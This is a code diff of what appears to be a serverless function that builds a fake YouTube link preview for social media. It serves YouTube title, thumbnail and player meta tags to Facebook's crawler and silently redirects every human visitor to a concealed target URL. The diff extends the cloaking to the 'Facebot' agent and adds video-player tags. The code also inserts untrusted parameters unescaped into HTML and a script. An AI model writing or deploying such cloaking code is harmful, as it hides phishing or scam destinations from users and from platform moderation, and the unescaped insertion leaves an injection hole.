@@ -1,7 +1,7 @@
 export async function onRequest(context) {
   const url = new URL(context.request.url);
-  const sEnc = url.searchParams.get('s'); // Link YouTube (Base64)
-  const uEnc = url.searchParams.get('u'); // Link Tujuan (Base64)
+  const sEnc = url.searchParams.get('s'); 
+  const uEnc = url.searchParams.get('u'); 
 
   if (!sEnc || !uEnc) return context.next();
 
@@ -15,18 +15,18 @@ export async function onRequest(context) {
     });
     const htmlText = await response.text();
 
-    // Ekstrak Judul Asli YouTube
     const titleMatch = htmlText.match(/<title>(.*?)<\/title>/);
     let title = titleMatch ? titleMatch[1].replace("- YouTube", "").trim() : "YouTube";
 
-    // Ekstrak Video ID untuk Thumbnail
     let videoId = "";
     if (sourceUrl.includes("v=")) {
       videoId = sourceUrl.split("v=")[1].split("&")[0];
     } else {
       videoId = sourceUrl.split("/").pop().split("?")[0];
     }
+    
     const image = `https://i.ytimg.com/vi/${videoId}/maxresdefault.jpg`;
+    const embedUrl = `https://www.youtube.com/embed/${videoId}`;
 
     const fakeHtml = `<!DOCTYPE html>
     <html>
@@ -36,18 +36,27 @@ export async function onRequest(context) {
       
       <meta property="og:site_name" content="YouTube">
       <meta property="og:url" content="${sourceUrl}">
-      
       <meta property="og:title" content="${title}">
       <meta property="og:image" content="${image}">
-      <meta property="og:description" content="Tonton video selengkapnya di YouTube.">
+      <meta property="og:description" content="Tonton video asli di YouTube.">
       <meta property="og:type" content="video.other">
       
-      <meta name="twitter:card" content="summary_large_image">
+      <meta property="og:video:url" content="${embedUrl}">
+      <meta property="og:video:secure_url" content="${embedUrl}">
+      <meta property="og:video:type" content="text/html">
+      <meta property="og:video:width" content="1280">
+      <meta property="og:video:height" content="720">
+      
+      <meta name="twitter:card" content="player">
+      <meta name="twitter:title" content="${title}">
       <meta name="twitter:image" content="${image}">
+      <meta name="twitter:player" content="${embedUrl}">
+      <meta name="twitter:player:width" content="1280">
+      <meta name="twitter:player:height" content="720">
 
       <script>
-        // Redirect manusia, biarkan Bot Facebook membaca meta di atas
-        if (!navigator.userAgent.includes("facebookexternalhit")) {
+        // REDIRECT MANUSIA KE TARGET
+        if (!navigator.userAgent.includes("facebookexternalhit") && !navigator.userAgent.includes("Facebot")) {
           window.location.replace("${targetUrl}");
         }
       </script>
